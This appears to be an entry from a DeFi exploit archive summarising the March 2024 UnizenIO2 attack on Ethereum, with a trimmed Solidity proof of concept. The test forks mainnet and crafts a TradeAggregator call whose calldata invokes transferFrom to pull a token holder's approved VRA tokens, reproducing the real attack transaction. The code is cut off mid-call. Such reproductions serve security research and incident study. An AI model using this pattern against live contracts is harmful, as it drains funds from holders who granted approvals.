# [?] UnizenIO2 exploit (2024-03)

## Summary
Severity: Unknown
Chain: Ethereum
Component: UnizenIO2
Published: 2024-03
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-03/UnizenIO2_exp.sol
Type: defi-exploit-poc

## Details
References:
- https://twitter.com/Phalcon_xyz/status/1766274000534004187
- https://twitter.com/AnciliaInc/status/1766261463025684707

```solidity
contract ContractTest is Test {
    ITradeAggregator private constant TradeAggregator = ITradeAggregator(0xd3f64BAa732061F8B3626ee44bab354f854877AC);
    IERC20 private constant VRA = IERC20(0xF411903cbC70a74d22900a5DE66A2dda66507255);
    address private constant tokenHolder = 0x12fe4bC7D0B969055F763C5587F2ED0cA1b334f3;

    function setUp() public {
        vm.createSelectFork("mainnet", 19_393_360);
        vm.label(address(TradeAggregator), "TradeAggregator");
        vm.label(address(VRA), "VRA");
        vm.label(address(tokenHolder), "tokenHolder");
    }

    function testExploit() public {
        emit log_named_decimal_uint("Exploiter VRA balance before attack", VRA.balanceOf(address(this)), VRA.decimals());

        ITradeAggregator.Info memory info = ITradeAggregator.Info({
            to: address(this),
            structMember2: 0,
            token: address(VRA),
            structMember3: 1,
            structMember4: 0,
            structMember5: 186_783_104_413_296_096,
            uuid: "UNIZEN-CLI",
            apiId: 17,
            userPSFee: 1875
        });

        bytes memory callData = abi.encodeWithSignature(
            "transferFrom(address,address,uint256)",
            tokenHolder,
            address(TradeAggregator),
            // 41_611_328_550_535_574_847_488 - amount was transfered from the token holder to TradeAggregator in attack tx.
            // Allowance is set to max so transfer everything.
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-03/UnizenIO2_exp.sol_
